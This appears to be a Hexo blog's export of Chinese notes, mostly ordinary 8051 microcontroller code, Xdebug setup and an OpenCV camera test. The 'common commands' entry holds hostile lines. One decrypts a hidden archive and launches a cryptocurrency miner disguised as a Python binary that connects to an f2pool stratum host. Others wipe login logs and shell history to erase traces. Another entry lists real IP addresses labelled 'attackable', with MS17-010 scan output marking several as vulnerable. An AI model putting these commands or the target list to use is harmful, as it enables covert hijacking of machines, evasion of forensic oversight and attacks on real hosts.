<h4 id="i2cinter-interface-circuit芯片间总线">I2C(Inter Interface
Circuit,芯片间总线)</h4>
]]></content>
      <categories>
        <category>单片机</category>
      </categories>
  </entry>
  <entry>
    <title>单片机-显示设备</title>
    <url>/%E5%8D%95%E7%89%87%E6%9C%BA-%E6%98%BE%E7%A4%BA%E8%AE%BE%E5%A4%87/</url>
    <content><![CDATA[<h2 id="显示设备">显示设备</h2>
<h3 id="lcd1602">LCD1602：</h3>
<h4 id="引脚定义">引脚定义：</h4>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">引脚号</th>
<th style="text-align: center;">符号</th>
<th style="text-align: center;">引脚说明</th>
<th style="text-align: center;">引脚号</th>
<th style="text-align: center;">符号</th>
<th style="text-align: center;">引脚说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">VSS</td>
<td style="text-align: center;">电源地</td>
<td style="text-align: center;">9</td>
<td style="text-align: center;">D2</td>
<td style="text-align: center;">数据端口</td>
</tr>
<tr class="even">
<td style="text-align: center;">2</td>
<td style="text-align: center;">VDD</td>
<td style="text-align: center;">电源正极</td>
<td style="text-align: center;">10</td>
<td style="text-align: center;">D3</td>
<td style="text-align: center;">数据端口</td>
</tr>
<tr class="odd">
<td style="text-align: center;">3</td>
<td style="text-align: center;">VO</td>
<td style="text-align: center;">偏压信号</td>
<td style="text-align: center;">11</td>
<td style="text-align: center;">D4</td>
<td style="text-align: center;">数据端口</td>
</tr>
<tr class="even">
<td style="text-align: center;">4</td>
<td style="text-align: center;">RS</td>
<td style="text-align: center;">命令/数据</td>
<td style="text-align: center;">12</td>
<td style="text-align: center;">D5</td>
<td style="text-align: center;">数据端口</td>
</tr>
<tr class="odd">
<td style="text-align: center;">5</td>
<td style="text-align: center;">RW</td>
<td style="text-align: center;">读/写</td>
<td style="text-align: center;">13</td>
<td style="text-align: center;">D6</td>
<td style="text-align: center;">数据端口</td>
</tr>
<tr class="even">
<td style="text-align: center;">6</td>
<td style="text-align: center;">E</td>
<td style="text-align: center;">使能</td>
<td style="text-align: center;">14</td>
<td style="text-align: center;">D7</td>
<td style="text-align: center;">数据端口</td>
</tr>
<tr class="odd">
<td style="text-align: center;">7</td>
<td style="text-align: center;">D0</td>
<td style="text-align: center;">数据端口</td>
<td style="text-align: center;">15</td>
<td style="text-align: center;">A</td>
<td style="text-align: center;">背光正极</td>
</tr>
<tr class="even">
<td style="text-align: center;">8</td>
<td style="text-align: center;">D1</td>
<td style="text-align: center;">数据端口</td>
<td style="text-align: center;">16</td>
<td style="text-align: center;">K</td>
<td style="text-align: center;">背光负极</td>
</tr>
</tbody>
</table>
<h4 id="基本操作">基本操作：</h4>
<ol type="1">
<li>读状态：输入RS=0，RW=1，E=1。输出：D0—D7为状态字。</li>
<li>读数据：输入RS=1，RW=1，E=1。输出：D0—D7为数据。用于读取busy标志。</li>
<li>写命令：输入RS=0，RW=0，E=正脉冲。输出：无。</li>
<li>写数据：输入RS=1，RW=0，E=正脉冲。输出：无。</li>
</ol>
<p><strong>E</strong>高脉冲的意思是你先向<strong>E</strong>写入低电平,然后写入<strong>RS</strong>,<strong>RW</strong>,然后向<strong>E</strong>写入高电平。</p>
<h4 id="控制命令">控制命令：</h4>
<ol type="1">
<li>01H：清屏。</li>
<li>02H：光标返回。</li>
<li>输入方式设置（EnterModeSet），这些指令规定了两个方面：一是写入一个DDRAM单元后，地址指针如何改变（加一还是减一）；二是屏幕上的内容是否滚动。
04H：写入DDRAM后，地址指针减一（光标左移一位），比如第一个字符写入8FH，则下一个字符会写入8EH；屏幕上的内容不滚动。
05H：写入DDRAM后，地址指针减一，同上一种情况；每一个字符写入以后，屏幕上的内容向右滚动一个字符位，光标显示的位置不动。
06H：写入DDRAM后，地址指针加一（光标右移一位），比如第一个字符写入80H，则下一个字符会写入81H；屏幕上的内容也是不滚动。这应该是最常用的一种显示方式。
07H：写入DDRAM后，地址指针加一，同上一种情况；每一个字符写入以后，屏幕上的内容向左滚动一个字符位，光标显示的位置不移动。</li>
<li>屏幕开关、光标开关、闪烁开关。
08H、09H、0AH、0BH：关闭显示屏，实质上是不把DDRAM中的内容对应显示在屏幕上，对DDRAM的操作还是在进行的，执行这条指令，接着对
DDRAM进行写入，屏幕上没有任何内容，但是接着执行下面的某条指令，就能看到刚才屏幕关闭期间，对DDRAM操作的效果了。
0cH：打开显示屏，不显示光标，光标所在位置的字符不闪烁。
0dH：打开显示屏，不显示光标，光标所在位置的字符闪烁。
0eH：打开显示屏，显示光标，光标所在位置的字符不闪烁。
0fH：打开显示屏，显示光标，光标所在位置的字符闪烁。
关于光标的位置：光标所在的位置指示了下一个被写入的字符所处的位置，假如在写入下一个字符前没有通过指令设置DDRAM的地址，那么这个字符就应该显示在光标指定的地方。</li>
<li>设置光标移动（本质就是AC的增加还是减少）、整体画面是否滚动。
10H：每输入一次该指令，AC就减一，对应了光标向左移动一格。整体的画面不滚动。
14H：每输入一次该指令，AC就加一，对应了光标向右移动一格。整体的画面不滚动。
18H：每输入一次该指令，整体的画面就向左滚动一个字符位。
1CH：每输入一次该指令，整体的画面就向右滚动一个字符位。画面在滚动的时候，每行的首尾是连在一起的，也就是每行的第一个字符，若左移25次，就会显示在该行的最后一格。在画面滚动的过程中，AC的值也是变化的。</li>
<li>显示模式设定指令，设定了显示几行，显示什么样的点阵字符，数据总线占用几位。
20H：4位总线，单行显示，显示5×7的点阵字符。
24H：4位总线，单行显示，显示5×10的点阵字符。
28H：4位总线，双行显示，显示5×7的点阵字符。
2CH：4位总线，双行显示，显示5×10的点阵字符。
30H：8位总线，单行显示，显示5×7的点阵字符。
34H：8位总线，单行显示，显示5×10的点阵字符。
38H：8位总线，双行显示，显示5×7的点阵字符。这是最常用的一种模式。
3CH：8位总线，双行显示，显示5×10的点阵字符。</li>
</ol>
<h4 id="代码实例">代码实例：</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;reg51.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> uint unsigned int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> uchar unsigned char </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> out P0</span></span><br><span class="line"></span><br><span class="line">sbit LCD_RS=P2^<span class="number">1</span>;</span><br><span class="line">sbit LCD_RW=P2^<span class="number">2</span>;</span><br><span class="line">sbit LCD_E=P2^<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delayms</span><span class="params">(uint)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">check_busy</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_cmd</span><span class="params">(uchar)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_dat</span><span class="params">(uchar)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">string</span><span class="params">(uchar,uchar)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">lcd_initial</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    lcd_initial();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">string</span>(<span class="number">0x85</span>,<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        <span class="built_in">string</span>(<span class="number">0xc2</span>,<span class="string">&quot;The World&quot;</span>);</span><br><span class="line">        delayms(<span class="number">100</span>);</span><br><span class="line">        write_cmd(<span class="number">0x01</span>);</span><br><span class="line">        delayms(<span class="number">100</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delayms</span><span class="params">(uint n)</span>&#123;</span><br><span class="line">    uint i;</span><br><span class="line">    <span class="keyword">while</span>(n--)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">113</span>;i++);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_busy</span><span class="params">()</span>&#123;</span><br><span class="line">    uchar dt;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        dt=<span class="number">0xff</span>;</span><br><span class="line">        LCD_E=<span class="number">0</span>;    </span><br><span class="line">        LCD_RS=<span class="number">0</span>;</span><br><span class="line">        LCD_RW=<span class="number">1</span>;</span><br><span class="line">        LCD_E=<span class="number">1</span>;</span><br><span class="line">        dt=out;</span><br><span class="line">    &#125;<span class="keyword">while</span>(dt&amp;<span class="number">0x80</span>);</span><br><span class="line">    LCD_E=<span class="number">0</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_cmd</span><span class="params">(uchar com)</span>&#123;</span><br><span class="line">    check_busy();</span><br><span class="line">    LCD_E=<span class="number">0</span>;</span><br><span class="line">    LCD_RS=<span class="number">0</span>;</span><br><span class="line">    LCD_RW=<span class="number">0</span>;</span><br><span class="line">    out=com;</span><br><span class="line">    LCD_E=<span class="number">1</span>;</span><br><span class="line">    _nop_();</span><br><span class="line">    LCD_E=<span class="number">0</span>;</span><br><span class="line">    delayms(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_dat</span><span class="params">(uchar dat)</span>&#123;</span><br><span class="line">    check_busy();</span><br><span class="line">    LCD_E=<span class="number">0</span>;</span><br><span class="line">    LCD_RS=<span class="number">1</span>;</span><br><span class="line">    LCD_RW=<span class="number">0</span>;</span><br><span class="line">    out=dat;</span><br><span class="line">    LCD_E=<span class="number">1</span>;</span><br><span class="line">    _nop_();</span><br><span class="line">    LCD_E=<span class="number">0</span>;</span><br><span class="line">    delayms(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">string</span><span class="params">(uchar ad,uchar *s)</span>&#123;</span><br><span class="line">    write_cmd(ad);</span><br><span class="line">    <span class="keyword">while</span>(*s&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        write_dat(*s++);</span><br><span class="line">        delayms(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lcd_initial</span><span class="params">()</span>&#123;</span><br><span class="line">    write_cmd(<span class="number">0x38</span>);</span><br><span class="line">    write_cmd(<span class="number">0x0c</span>);</span><br><span class="line">    write_cmd(<span class="number">0x05</span>);</span><br><span class="line">    write_cmd(<span class="number">0x01</span>);</span><br><span class="line">    delayms(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="八段数码管">八段数码管</h3>
<h4 id="段码表">段码表</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//共阳不带点：</span></span><br><span class="line">uchar code noDot[]=&#123;<span class="number">0xc0</span>,<span class="number">0xf9</span>,<span class="number">0xa4</span>,<span class="number">0xb0</span>,<span class="number">0x99</span>,<span class="number">0x92</span>,<span class="number">0x82</span>,<span class="number">0xf8</span>,<span class="number">0x80</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x83</span>,<span class="number">0xc6</span>,<span class="number">0xa1</span>,<span class="number">0x86</span>,<span class="number">0x8e</span>&#125;;</span><br><span class="line"><span class="comment">//共阴不带点：</span></span><br><span class="line">uchar code noDot[]=&#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,<span class="number">0x7f</span>,<span class="number">0x6f</span>,<span class="number">0x77</span>,<span class="number">0x7c</span>,<span class="number">0x39</span>,<span class="number">0x5e</span>,<span class="number">0x79</span>,<span class="number">0x71</span>&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>单片机</category>
      </categories>
  </entry>
  <entry>
    <title>单片机-输入设备</title>
    <url>/%E5%8D%95%E7%89%87%E6%9C%BA-%E8%BE%93%E5%85%A5%E8%AE%BE%E5%A4%87/</url>
    <content><![CDATA[<h4 id="键盘示例程序">键盘示例程序</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;reg51.c&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> uint unsigned int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> uchar unsigned char</span></span><br><span class="line"></span><br><span class="line">sbit MDzhengzhuan_control=P0^<span class="number">0</span>;</span><br><span class="line">sbit MDfanzhuan_control=P0^<span class="number">1</span>;</span><br><span class="line">sbit MDstop_control=P0^<span class="number">2</span>;</span><br><span class="line">sbit light_on_control=P0^<span class="number">3</span>;</span><br><span class="line">sbit light_off_control=P0^<span class="number">4</span>;</span><br><span class="line">sbit fmq_on_control=P0^<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">sbit JDQ_in=P1^<span class="number">0</span>;</span><br><span class="line">sbit MDfu=P1^<span class="number">3</span>;</span><br><span class="line">sbit MDzheng=P1^<span class="number">4</span>;</span><br><span class="line">sbit FMQ=P1^<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delay</span><span class="params">(uint ms)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">key_input</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MDzhengzhuan</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MDfanzhuan</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MDstop</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">light_on</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">light_off</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fmq_on</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    P0=<span class="number">0xff</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        key_input();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delay</span><span class="params">(uint ms)</span>&#123;</span><br><span class="line">    uint i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;ms;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">110</span>;j++);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">key_input</span><span class="params">()</span>&#123;</span><br><span class="line">    P0=<span class="number">0xff</span>;</span><br><span class="line">    <span class="keyword">if</span>((P0&amp;<span class="number">0x3f</span>)!=<span class="number">0x3f</span>)&#123;</span><br><span class="line">        delay(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span>(MDzhengzhuan_control==<span class="number">0</span>)&#123;</span><br><span class="line">            MDzhengzhuan();</span><br><span class="line">            delay(<span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(MDfanzhuan_control==<span class="number">0</span>)&#123;</span><br><span class="line">            MDfanzhuan();</span><br><span class="line">            delay(<span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(MDstop_control==<span class="number">0</span>)&#123;</span><br><span class="line">            MDstop();</span><br><span class="line">            delay(<span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(light_on_control==<span class="number">0</span>)&#123;</span><br><span class="line">            light_on();</span><br><span class="line">            delay(<span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(light_off_control==<span class="number">0</span>)&#123;</span><br><span class="line">            light_off();</span><br><span class="line">            delay(<span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(fmq_on_control==<span class="number">0</span>)&#123;</span><br><span class="line">            fmq_on();</span><br><span class="line">            delay(<span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MDzhengzhuan</span><span class="params">()</span>&#123;</span><br><span class="line">    MDzheng=<span class="number">1</span>;</span><br><span class="line">    MDfu=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MDfanzhuan</span><span class="params">()</span>&#123;</span><br><span class="line">    MDzheng=<span class="number">0</span>;</span><br><span class="line">    MDfu=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MDstop</span><span class="params">()</span>&#123;</span><br><span class="line">    MDzheng=<span class="number">0</span>;</span><br><span class="line">    MDfu=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">light_on</span><span class="params">()</span>&#123;</span><br><span class="line">    JDQ_in=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">light_off</span><span class="params">()</span>&#123;</span><br><span class="line">    JDQ_in=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fmq_on</span><span class="params">()</span>&#123;</span><br><span class="line">    FMQ=<span class="number">0</span>;</span><br><span class="line">    delay(<span class="number">1000</span>);</span><br><span class="line">    FMQ=<span class="number">1</span>;</span><br><span class="line">    delay(<span class="number">1000</span>);</span><br><span class="line">    FMQ=<span class="number">0</span>;</span><br><span class="line">    delay(<span class="number">1000</span>);</span><br><span class="line">    FMQ=<span class="number">1</span>;</span><br><span class="line">    delay(<span class="number">1000</span>);</span><br><span class="line">    FMQ=<span class="number">0</span>;</span><br><span class="line">    delay(<span class="number">1000</span>);</span><br><span class="line">    FMQ=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>单片机</category>
      </categories>
  </entry>
  <entry>
    <title>呼救要素</title>
    <url>/%E5%91%BC%E6%95%91%E8%A6%81%E7%B4%A0/</url>
    <content><![CDATA[<h2 id="九要素">九要素：</h2>
<ol type="1">
<li>身份信息</li>
<li>联系方式/无线电频率</li>
<li>遭遇情况</li>
<li>伤员人数、伤情、运输方式</li>
<li>需要医疗器械</li>
<li>现场位置</li>
<li>地形特征/接收识别方式</li>
<li>现场情况（安全/危险）</li>
<li>NBC(核、生物、化学)</li>
</ol>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
  </entry>
  <entry>
    <title>在配置linux+php+vscode+xdebug时遇到的问题</title>
    <url>/%E5%9C%A8%E9%85%8D%E7%BD%AElinux-php-vscode-xdebug%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>首先在用户配置json配置这个,用于显示默认配置 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;workbench.settings.useSplitJSON&quot;: true,</span><br></pre></td></tr></table></figure>
###　源形式</p>
<p>安装对应版本的php(版本号)-dev,可以使用<code>phpize</code>命令
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install php版本号-dev</span><br></pre></td></tr></table></figure></p>
<p>检查你是否使用fpm启动php,如果是fpm,请添加语句到fpm目录下的<code>php.ini</code></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[XDebug]</span></span><br><span class="line"><span class="attr">xdebug.remote_enable</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.remote_autostart</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>###　源码形式</p>
<p>下载xdebug源码包,解压进入目录,运行<code>phpize</code>生成configure
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make intall</span><br></pre></td></tr></table></figure>
得到<code>.so</code>路径,添加上述允许远程调试的指令,并添加引用目录
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">zend_extension</span> = php_xdebug.so</span><br></pre></td></tr></table></figure></p>
<p>当你可以在phpinfo页面看到xdebug以及 xdebug.remote_enable 与
xdebug.remote_autostart 为on时则说明开启成功</p>
]]></content>
      <categories>
        <category>answer&amp;question</category>
      </categories>
  </entry>
  <entry>
    <title>工装设计</title>
    <url>/%E5%B7%A5%E8%A3%85%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>使用随身wifi(Ufi)设备刷入linux,再安装python等一系列工具进行基础开发环境建设</p>
<h3 id="安装开发软件">安装开发软件</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install python3 python3-pip python3-venv</span><br><span class="line">python3 -m venv ./venv</span><br><span class="line"><span class="built_in">cd</span> venv</span><br><span class="line"><span class="built_in">source</span> bin/activate</span><br><span class="line">pip install numpy matplotlib opencv-python opencv opencv-contrib-python pyzbar pyserial</span><br></pre></td></tr></table></figure>
<h3 id="测试程序">测试程序</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"><span class="comment">#Author: Divint3</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line">camera = cv2.VideoCapture(<span class="number">2</span>) <span class="comment"># 这里使用VideoCapture(2)的原因是此板原来有两个video设备,因为其底板是高通方案,所以有板载摄像头的驱动但是摄像头并未实装,所以在按照次序进行操作时,usb摄像头在第三个映射文件上也就是/dev/video2</span></span><br><span class="line">ret, frame = cap.read()</span><br><span class="line">cv2.imwrite(<span class="string">&quot;1.jpg&quot;</span>, frame)</span><br><span class="line">camera.release() <span class="comment"># 释放摄像头</span></span><br></pre></td></tr></table></figure>
<h2 id="参考资料">参考资料</h2>
<p><a
href="https://blog.csdn.net/qq_29568427/article/details/109708890">Python+opencv调用摄像头实现拍照并保存_zlj0133的博客-CSDN博客_python调用摄像头拍照保存</a></p>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>常用命令</title>
    <url>/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h3 id="常用命令">常用命令</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install netcat-traditional -y</span><br><span class="line">update-alternatives --config nc</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/wtmp &amp;&amp; <span class="built_in">echo</span> &gt; /var/log/btmp &amp;&amp; <span class="built_in">echo</span> &gt; /var/log/lastlog &amp;&amp;<span class="built_in">history</span> -c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/usr/lib/megumi | openssl des3 -d -k <span class="string">&quot;11..11+*Ax&quot;</span> |tar zxf - -C /root/.local</span><br><span class="line">start-stop-daemon -S -m -q -b -p /run/megumi.pid -x /root/.local/.venv/python -- -a ethash -o stratum+tcp://eth.f2pool.com:6688 -u mekumi -p x</span><br><span class="line">start-stop-daemon -K -q -p /run/megumi.pid --remove-pidfile</span><br><span class="line"></span><br><span class="line">go <span class="built_in">env</span> -w GOPROXY=https://mirrors.aliyun.com/goproxy/,direct</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> http_proxy=socks5://127.0.0.1:10808</span><br><span class="line"><span class="built_in">set</span> https_proxy=%http_proxy%</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> proxy_host=<span class="string">&quot;192.168.1.114:10809&quot;</span></span><br><span class="line"><span class="built_in">export</span> HTTP_PROXY=http://<span class="variable">$&#123;proxy_host&#125;</span></span><br><span class="line"><span class="built_in">export</span> HTTPS_PROXY=http://<span class="variable">$&#123;proxy_host&#125;</span></span><br><span class="line"><span class="built_in">export</span> NO_PROXY=127.0.0.0/8,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,cattle-system.svc</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/wtmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/btmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/lastlog</span><br><span class="line"><span class="built_in">history</span> -c</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>常用正则表达式</title>
    <url>/%E5%B8%B8%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">([0-9]&#123;1,3&#125;[\.])&#123;3&#125;[0-9]&#123;1,3&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(\&lt;([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\&gt;\.)&#123;3&#125;\&lt;([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可攻击 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">211.71.232.42</span><br><span class="line">211.71.232.43</span><br><span class="line">211.71.232.54</span><br><span class="line">211.71.232.55</span><br><span class="line">211.71.232.132</span><br><span class="line">211.71.232.133</span><br><span class="line">211.71.232.134</span><br><span class="line">211.71.232.135</span><br><span class="line">211.71.232.136</span><br><span class="line">211.71.232.137</span><br><span class="line">211.71.232.138</span><br><span class="line">211.71.232.139</span><br><span class="line">211.71.232.140</span><br><span class="line">211.71.232.141</span><br><span class="line">211.71.232.142</span><br><span class="line">211.71.232.143</span><br><span class="line">211.71.232.144</span><br><span class="line">211.71.232.147</span><br><span class="line">211.71.232.148</span><br><span class="line">211.71.232.156</span><br><span class="line">211.71.232.157</span><br></pre></td></tr></table></figure> 检测结果 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[-] 211.71.232.42:445     - Host does NOT appear vulnerable.</span><br><span class="line">[-] 211.71.232.54:445     - Host does NOT appear vulnerable.</span><br><span class="line">[*] Scanned  3 of 21 hosts (14% complete)</span><br><span class="line">[+] 211.71.232.132:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x86 (32-bit)</span><br><span class="line">[*] Scanned  5 of 21 hosts (23% complete)</span><br><span class="line">[-] 211.71.232.133:445    - Host does NOT appear vulnerable.</span><br><span class="line">[*] Scanned  7 of 21 hosts (33% complete)</span><br><span class="line">[+] 211.71.232.135:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2003 3790 Service Pack 2 x86 (32-bit)</span><br><span class="line">[*] Scanned  9 of 21 hosts (42% complete)</span><br><span class="line">[-] 211.71.232.137:445    - Host does NOT appear vulnerable.</span><br><span class="line">[-] 211.71.232.138:445    - Host does NOT appear vulnerable.</span><br><span class="line">[*] Scanned 11 of 21 hosts (52% complete)</span><br><span class="line">[+] 211.71.232.139:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2003 3790 Service Pack 2 x86 (32-bit)</span><br><span class="line">[*] Scanned 13 of 21 hosts (61% complete)</span><br><span class="line">[+] 211.71.232.141:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[+] 211.71.232.142:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] Scanned 15 of 21 hosts (71% complete)</span><br><span class="line">[+] 211.71.232.143:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] Scanned 17 of 21 hosts (80% complete)</span><br><span class="line">[+] 211.71.232.147:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] Scanned 19 of 21 hosts (90% complete)</span><br><span class="line">[+] 211.71.232.156:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] Scanned 21 of 21 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure></p>
